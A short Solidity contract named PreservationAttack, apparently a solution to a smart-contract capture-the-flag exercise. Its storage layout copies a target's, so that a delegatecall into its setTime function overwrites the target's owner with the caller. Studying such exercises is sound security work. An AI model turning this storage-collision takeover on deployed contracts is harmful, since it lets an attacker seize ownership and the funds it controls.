// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract PreservationAttack {
  address public addr1;
  address public addr2;
  address public owner;
  
  function setTime(uint256) external {
    owner = msg.sender;
  }
}